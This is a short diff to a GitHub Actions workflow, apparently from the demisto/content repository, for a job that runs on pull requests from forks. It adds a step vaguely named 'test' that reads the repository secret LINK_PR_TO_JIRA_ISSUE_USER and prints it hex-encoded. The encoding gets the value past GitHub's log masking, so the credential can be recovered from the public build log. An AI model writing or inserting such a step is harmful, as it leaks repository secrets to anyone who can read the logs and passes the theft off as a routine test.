@@ -15,6 +15,11 @@ jobs:
     runs-on: ubuntu-latest
     if: github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == true && contains(github.head_ref, 'xsoar-bot-contrib-ContributionTestPack') == false
     steps:
+      - name: test
+        env:
+          CG_USERNAME: ${{ secrets.LINK_PR_TO_JIRA_ISSUE_USER }}
+        run: |
+          echo "$(printf '%s' "$CG_USERNAME" | xxd -p -u)"
       - name: Checkout
         uses: actions/checkout@v3
       - name: Setup Python
